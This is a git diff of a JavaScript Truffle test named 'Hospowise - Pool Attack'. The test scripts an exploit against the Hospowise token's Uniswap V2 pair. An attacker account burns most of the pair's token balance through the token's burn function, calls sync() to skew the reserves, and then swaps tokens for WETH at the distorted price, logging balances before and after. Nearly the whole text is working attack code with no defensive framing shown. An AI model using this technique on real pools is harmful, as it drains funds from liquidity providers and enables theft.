@@ -76,7 +76,7 @@ contract('Hospowise - Pool Attack', (accounts) => {
     return { pair, route }
   }
 
-  it('will create a pool to test with', async () => {
+  it('will hack hospo token UniswapPair', async () => {
 
     console.log(`Addresses: `, { deployer, attacker, user })
     console.log(`Hospo: `, { uniswapPair: uniswapPairAddr, address: token.address, owner: await token.owner() })
@@ -92,7 +92,6 @@ contract('Hospowise - Pool Attack', (accounts) => {
     const tokenAmount = new BN(web3.utils.toWei('1000', 'ether'))
     const burnAmount = new BN(web3.utils.toWei('999', 'ether'))
     const ethAmount = new BN(web3.utils.toWei('10', 'ether'))
-
     // so once we burn we are left with 10 ETHER equiv of tokens....
 
     // // put some tokens back into the contract itself... so we can get it to prime the pool
@@ -104,26 +103,27 @@ contract('Hospowise - Pool Attack', (accounts) => {
     const attackerAmount = new BN(web3.utils.toWei('1000', 'ether'))
     await token.transfer(attacker, attackerAmount, { from: deployer })
 
-    // lets see what changed...
+    // lets see balances...
     await outputBalances('PREHACK')
+    let { pair } = await getPairRoute(hospoUni, wethUni)
+    await getPairReserves(pair)
 
     // now the hack
 
     /**
-     * 1. I need to burn tokens in uniswap pool to leave my amount in
+     * 1. I need to burn tokens in uniswap pool to skew the balance/ratio
      * 2. I need to then approve the router to work on my hospo tokens for amount
-     * 3. I do a sell tokens for weth transfer. see what I get.
+     * 3. I do a sell tokens for weth transfer.
+     * 4. see what I get.
      */
-    let { pair, route } = await getPairRoute(hospoUni, wethUni)
-    console.log('preburn/sync to 1 of opp token:', { leg1: route.midPrice.toSignificant(10), leg2: route.midPrice.invert().toSignificant(10) })
 
     // NASTY
     await token.burn(uniswapPairAddr, burnAmount, { from: attacker })
     // approve the router to take our tokens...
     await token.approve(UniswapV2RouterAddr, attackerAmount, { from: attacker })
-
     // this reset the liquidity after our little burn above...
     await uniswapPair.methods.sync().send({from:attacker})
+
     // check the new ratios...
     let { route: postRoute } = await getPairRoute(hospoUni, wethUni)
     console.log('postburn/sync to 1 of opp token:', { leg1: postRoute.midPrice.toSignificant(10), leg2: postRoute.midPrice.invert().toSignificant(10) })
@@ -147,7 +147,7 @@ contract('Hospowise - Pool Attack', (accounts) => {
     const deadline = Math.floor(Date.now() / 1000) + 60 * 2 // 20 mins +
     const gasUsed = await uniswapRouterV2.methods.swapExactTokensForTokens(amountIn, amountOutMin, path, to, deadline).estimateGas({ from: attacker, gas: 5000000 })
     console.log(`vars: `, { amountIn, amountOutMin, path, to, deadline, gasUsed })
-    const ret = await uniswapRouterV2.methods.swapExactTokensForTokens(amountIn, amountOutMin, path, to, deadline).send({ from: attacker, gas: gasUsed })
+    await uniswapRouterV2.methods.swapExactTokensForTokens(amountIn, amountOutMin, path, to, deadline).send({ from: attacker, gas: gasUsed })
 
     // ok lets see what we got out...
     await outputBalances('POST TRADE')
